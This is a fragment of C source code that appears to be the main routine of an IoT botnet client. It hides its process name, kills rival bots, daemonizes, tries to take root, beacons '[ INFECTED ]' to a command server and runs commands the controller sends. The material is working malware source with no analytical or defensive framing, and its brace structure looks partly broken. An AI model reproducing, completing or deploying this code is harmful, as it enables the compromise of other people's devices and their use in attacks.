		uint32_t vlu;
		uint8_t data[sizeof(uint32_t)];
	} nmb;
	nmb.data[0] = 0x00;
	nmb.data[1] = 0x01;
	nmb.data[2] = 0x02;
	nmb.data[3] = 0x03;
	switch (nmb.vlu)
	{
		case UINT32_C(0x00010203):
			return "BIG_ENDIAN";
		case UINT32_C(0x03020100):
			return "LITTLE_ENDIAN";
		case UINT32_C(0x02030001):
			return "BIG_ENDIAN_W";
		case UINT32_C(0x01000302):
			return "LITTLE_ENDIAN_W";
		default:
			return "UNKNOWN";
	}
}
int main(int argc, unsigned char *argv[]) {
        const char *lolsuckmekid = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        botkiller(KHcommSOCK);
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
		chdir("/");	
		setuid(0);				
		seteuid(0);
        signal(SIGPIPE, SIG_IGN);
        while(1) {
				if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; }
				sockprintf(mainCommSock, "\e[0;93m[ INFECTED ] Arch: %s || Type: %s]", getBuild(), getEndianness());
				UpdateNameSrvs();
				char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }
                        commBuf[got] = 0x00;
                        trim(commBuf);
                        if(strstr(commBuf, "ICMP") == commBuf) { // ICMP
                                continue;
                        }
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
                        unsigned char *message = commBuf;
                        if(*message == '!') {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;
                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;
                                while(pch) {
                                        if(*pch != '\n') {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1) {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++) {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
	}
}
